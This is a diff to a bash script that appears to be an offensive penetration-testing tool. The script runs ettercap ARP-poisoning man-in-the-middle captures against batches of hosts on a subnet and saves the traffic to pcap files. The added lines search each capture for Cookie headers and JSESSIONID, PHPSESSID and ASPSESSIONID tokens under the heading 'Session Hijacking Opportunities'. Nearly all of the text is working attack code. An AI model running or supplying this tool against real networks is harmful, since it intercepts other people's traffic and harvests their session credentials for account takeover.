@@ -39,7 +39,7 @@ if [ "$#" -ne 3 ]; then
   echo "**                                                 **"
   echo "*****************************************************"
   echo ""
-  echo "Author - Justin Hutchens - justinhutchens@gmail.com"
+  echo "Author - Hutch (Justin Hutchens)"
   echo ""
   exit
 fi
@@ -82,15 +82,23 @@ while [ $x -lt $(($lines+5)) ]; do
   group=$(sed -n $x,$(($x+$(($hosts-1))))p targets.temp | cut -d "." -f 4); 
   echo ""; 
   echo "[+] Starting Ettercap Capture $i..."; 
-  gnome-terminal -x ettercap -M arp:remote /$prefix.1/ /$prefix.$(echo $group | sed 's/ /,/g')/ -T -i $iface -w $scanname/$scanname_output$i.pcap; 
+  gnome-terminal -x ettercap -M arp:remote /$prefix.1/ /$prefix.$(echo $group | sed 's/ /,/g')/ -T -i $iface -w $scanname/capture_$i.pcap; 
   sleep 5;
   pid=$(ps aux | grep "ettercap -M" | grep -v "grep" | awk '{print $2}'); 
   while [ $pid ]; do 
     echo "...Still running"; 
-    sleep 30; 
+    sleep 30;
     pid=$(ps aux | grep "ettercap -M" | grep -v "grep" | awk '{print $2}'); 
   done; 
-  echo "[+] Process killed"; 
+  echo "[+] Process killed";
+  echo ""
+  echo "[+] Checking for Session Hijacking Opportunities..."
+  echo ""
+  if [[ -n $(ettercap -r $scanname/capture_$i.pcap -T | grep "Cookie:") ]]; then echo "Cookie Headers identified in capture..."; fi;
+  if [[ -n $(ettercap -r $scanname/capture_$i.pcap -T | grep "JSESSIONID=") ]]; then echo "JSESSIONID tokens identified in capture..."; fi;
+  if [[ -n $(ettercap -r $scanname/capture_$i.pcap -T | grep "PHPSESSID=") ]]; then echo "PHPSESSID tokens identified in capture..."; fi;
+  if [[ -n $(ettercap -r $scanname/capture_$i.pcap -T | grep "ASPSESSIONID=") ]]; then echo "ASPSESSIONID tokens identified in capture..."; fi;
+  echo ""          
   echo "[+] Starting next capture..."; 
   echo "";
   x=$((x+$hosts)); 
